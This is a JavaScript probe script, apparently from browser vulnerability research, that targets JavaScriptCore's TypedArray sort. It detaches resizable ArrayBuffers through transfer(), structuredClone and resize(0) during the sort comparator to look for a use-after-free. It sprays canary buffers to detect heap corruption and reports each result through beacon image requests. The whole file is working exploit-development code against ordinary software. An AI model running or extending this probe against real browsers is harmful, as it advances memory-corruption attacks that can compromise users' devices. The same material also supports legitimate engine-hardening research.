// CRASH_CLASS: HIGH
// PROBE P561: Transfer/Detach during Sort Comparator — UAF Test
//
// P559/P560 confirmed: JSC sort operates on stale backing store length
// after resize(). This probe tests: if we transfer() the RAB during
// sort's comparator, does the backing store get detached/freed while
// sort holds a stale data pointer? If yes → use-after-free.
//
// Tests:
//   A) transfer() / transferToFixedLength() / structuredClone availability
//   B) transfer() during sort comparator — does sort continue on detached memory?
//   C) Canary spray: detect heap corruption from sort writing to freed/moved backing store
//   D) structuredClone with transfer list during sort (alternative detach path)
//   E) resize(0) + transfer() combo during sort — double stale state

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P561-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(String(msg).slice(0, 500));
    } catch (e) {}
  }

  emit('START', 'transfer-uaf ua=' + navigator.userAgent.slice(0, 60));

  var hasTransfer = false, hasFixed = false, hasClone = false;

  // ======================== TEST A: CAPABILITY CHECK ========================
  emit('PHASE-A', 'start');
  try {
    var tA = new ArrayBuffer(64, { maxByteLength: 256 });
    hasTransfer = typeof tA.transfer === 'function';
    hasFixed = typeof tA.transferToFixedLength === 'function';
    hasClone = typeof structuredClone === 'function';
    emit('A-CAPS', 'transfer=' + hasTransfer + ' fixed=' + hasFixed + ' clone=' + hasClone);

    if (hasTransfer) {
      var tB = new ArrayBuffer(32, { maxByteLength: 128 });
      var f = new Float64Array(tB);
      f[0] = 42; f[1] = 99; f[2] = 77; f[3] = 11;
      var tC = tB.transfer();
      var oL, nL;
      try { oL = tB.byteLength; } catch (e) { oL = 'threw'; }
      try { nL = tC.byteLength; } catch (e) { nL = 'threw'; }
      emit('A-BASIC', 'orig=' + oL + ' new=' + nL);
      var fn = new Float64Array(tC);
      emit('A-DATA', fn[0] + ',' + fn[1] + ',' + fn[2] + ',' + fn[3]);

      var resizable = false;
      try { resizable = typeof tC.resize === 'function'; } catch (e) {}
      emit('A-NEWTYPE', 'resizable=' + resizable + ' maxBL=' + (tC.maxByteLength || 'undef'));
    }
  } catch (e) {
    emit('A-ERR', e.name + ': ' + String(e.message).slice(0, 100));
  }
  emit('PHASE-A', 'done');

  // ======================== TEST B: TRANSFER DURING SORT ========================
  // 16 Float64 descending [16..1], sort ascending.
  // On comparator #5: transfer() the RAB.
  // Key questions:
  //   - Does sort throw TypeError (detachment check)?
  //   - Does sort continue silently on the old backing store?
  //   - Does the NEW buffer contain sort's modifications?

  emit('PHASE-B', 'start');
  if (!hasTransfer) {
    emit('B-SKIP', 'no transfer()');
  } else {
    try {
      var rabB = new ArrayBuffer(128, { maxByteLength: 512 });
      var f64B = new Float64Array(rabB);
      for (var i = 0; i < 16; i++) f64B[i] = 16 - i;

      var bCalls = 0, bDid = false, bNew = null;
      var bSortOk = false;

      try {
        f64B.sort(function (a, b) {
          bCalls++;
          if (bCalls === 5 && !bDid) {
            bDid = true;
            try {
              bNew = rabB.transfer();
              emit('B-XFER', 'ok newLen=' + bNew.byteLength);
            } catch (e) {
              emit('B-XFER-FAIL', e.name + ': ' + String(e.message).slice(0, 80));
            }
          }
          return a - b;
        });
        bSortOk = true;
        emit('B-SORT-OK', 'calls=' + bCalls);
      } catch (e) {
        emit('B-SORT-THREW', e.name + ': ' + String(e.message).slice(0, 80) + ' calls=' + bCalls);
      }

      var origBL;
      try { origBL = rabB.byteLength; } catch (e) { origBL = 'threw'; }
      emit('B-ORIG', 'byteLength=' + origBL);

      try {
        var vLen = f64B.length;
        emit('B-VIEW', 'len=' + vLen);
      } catch (e) {
        emit('B-VIEW', 'threw:' + e.name);
      }

      if (bNew) {
        try {
          var f64N = new Float64Array(bNew);
          var vals = [];
          for (var j = 0; j < Math.min(f64N.length, 16); j++) vals.push(f64N[j]);
          emit('B-NEW', vals.slice(0, 8).join(','));
          if (vals.length > 8) emit('B-NEW2', vals.slice(8).join(','));

          var sorted = true;
          for (var k = 1; k < vals.length; k++) {
            if (vals[k] < vals[k - 1]) { sorted = false; break; }
          }
          emit('B-SORTED', sorted ? 'YES-sort-wrote-transferred' : 'NO-unsorted');
        } catch (e) {
          emit('B-NEW-ERR', e.name);
        }
      }
    } catch (e) {
      emit('B-ERR', e.name + ': ' + String(e.message).slice(0, 100));
    }
  }
  emit('PHASE-B', 'done');

  // ======================== TEST C: CANARY SPRAY + TRANSFER ========================
  // Same as B but with 150 canary buffers to detect heap corruption.
  // After transfer, drop the new buffer ref + GC pressure to try freeing.

  emit('PHASE-C', 'start');
  if (!hasTransfer) {
    emit('C-SKIP', 'no transfer()');
  } else {
    try {
      var CANARY = 3735928559;
      var cans = [];
      for (var cc = 0; cc < 150; cc++) {
        var cb = new ArrayBuffer(128);
        var cu = new Uint32Array(cb);
        for (var cj = 0; cj < 32; cj++) cu[cj] = CANARY;
        cans.push(cu);
      }

      var rabC = new ArrayBuffer(128, { maxByteLength: 512 });
      var f64C = new Float64Array(rabC);
      for (var ic = 0; ic < 16; ic++) f64C[ic] = (16 - ic) * 1000;

      var cCalls = 0, cDid = false, cNew = null;

      try {
        f64C.sort(function (a, b) {
          cCalls++;
          if (cCalls === 3 && !cDid) {
            cDid = true;
            try { cNew = rabC.transfer(); } catch (e) {}
          }
          if (cCalls === 8 && cNew) {
            cNew = null;
            for (var gp = 0; gp < 100; gp++) {
              var t = new ArrayBuffer(512);
              t = null;
            }
          }
          return a - b;
        });
        emit('C-SORT', 'ok calls=' + cCalls);
      } catch (e) {
        emit('C-SORT', 'threw:' + e.name + ' calls=' + cCalls);
      }

      var bad = 0;
      var det = [];
      for (var ck = 0; ck < cans.length; ck++) {
        for (var cl = 0; cl < 32; cl++) {
          if (cans[ck][cl] !== CANARY) {
            bad++;
            if (det.length < 4) det.push('c' + ck + '[' + cl + ']=0x' + (cans[ck][cl] >>> 0).toString(16));
            break;
          }
        }
      }
      emit('C-CANARY', 'n=' + cans.length + ' bad=' + bad);
      if (bad > 0) emit('C-CORRUPT', det.join(','));
    } catch (e) {
      emit('C-ERR', e.name + ': ' + String(e.message).slice(0, 100));
    }
  }
  emit('PHASE-C', 'done');

  // ======================== TEST D: STRUCTUREDCLONE TRANSFER ========================
  // Alternative detach: structuredClone(rab, { transfer: [rab] })
  // This detaches the original synchronously.

  emit('PHASE-D', 'start');
  if (!hasClone) {
    emit('D-SKIP', 'no structuredClone');
  } else {
    try {
      var rabD = new ArrayBuffer(128, { maxByteLength: 512 });
      var f64D = new Float64Array(rabD);
      for (var id = 0; id < 16; id++) f64D[id] = 16 - id;

      var dCalls = 0, dDid = false, dClone = null;
      try {
        f64D.sort(function (a, b) {
          dCalls++;
          if (dCalls === 5 && !dDid) {
            dDid = true;
            try {
              dClone = structuredClone(rabD, { transfer: [rabD] });
              emit('D-XFER', 'ok cloneLen=' + dClone.byteLength);
            } catch (e) {
              emit('D-XFER-ERR', e.name + ': ' + String(e.message).slice(0, 80));
            }
          }
          return a - b;
        });
        emit('D-SORT', 'ok calls=' + dCalls);
      } catch (e) {
        emit('D-SORT', 'threw:' + e.name + ' calls=' + dCalls);
      }

      if (dClone) {
        try {
          var f64dc = new Float64Array(dClone);
          var dv = [];
          for (var dj = 0; dj < Math.min(f64dc.length, 8); dj++) dv.push(f64dc[dj]);
          emit('D-DATA', dv.join(','));
        } catch (e) {
          emit('D-DATA-ERR', e.name);
        }
      }
    } catch (e) {
      emit('D-ERR', e.name + ': ' + String(e.message).slice(0, 100));
    }
  }
  emit('PHASE-D', 'done');

  // ======================== TEST E: RESIZE(0) THEN TRANSFER ========================
  // On comparator #3: resize(0). On #7: transfer().
  // Sort cached stale length=16 and stale data ptr.
  // After resize(0): byteLength=0 but backing store lives (maxBL reserved).
  // After transfer: backing store moved to new buffer.
  // Sort continues on stale ptr. If backing store was moved (not shared) → UAF.

  emit('PHASE-E', 'start');
  if (!hasTransfer) {
    emit('E-SKIP', 'no transfer()');
  } else {
    try {
      var rabE = new ArrayBuffer(128, { maxByteLength: 512 });
      var f64E = new Float64Array(rabE);
      for (var ie = 0; ie < 16; ie++) f64E[ie] = 16 - ie;

      var eCalls = 0, eRes = false, eXfer = false, eNew = null;
      try {
        f64E.sort(function (a, b) {
          eCalls++;
          if (eCalls === 3 && !eRes) {
            eRes = true;
            try { rabE.resize(0); emit('E-RESIZED', 'to 0'); } catch (e) { emit('E-RES-ERR', e.name); }
          }
          if (eCalls === 7 && !eXfer) {
            eXfer = true;
            try {
              eNew = rabE.transfer();
              emit('E-XFER', 'ok newLen=' + eNew.byteLength);
            } catch (e) {
              emit('E-XFER-ERR', e.name + ': ' + String(e.message).slice(0, 60));
            }
          }
          return a - b;
        });
        emit('E-SORT', 'ok calls=' + eCalls);
      } catch (e) {
        emit('E-SORT', 'threw:' + e.name + ' calls=' + eCalls);
      }

      if (eNew) {
        try {
          var eBL = eNew.byteLength;
          emit('E-NEWBL', String(eBL));
          if (eBL > 0) {
            var f64eN = new Float64Array(eNew);
            var ev = [];
            for (var ej = 0; ej < Math.min(f64eN.length, 8); ej++) ev.push(f64eN[ej]);
            emit('E-DATA', ev.join(','));
          }
        } catch (e) {
          emit('E-DATA-ERR', e.name);
        }
      }
    } catch (e) {
      emit('E-ERR', e.name + ': ' + String(e.message).slice(0, 100));
    }
  }
  emit('PHASE-E', 'done');

  emit('ALIVE', 'all tests completed');
})();
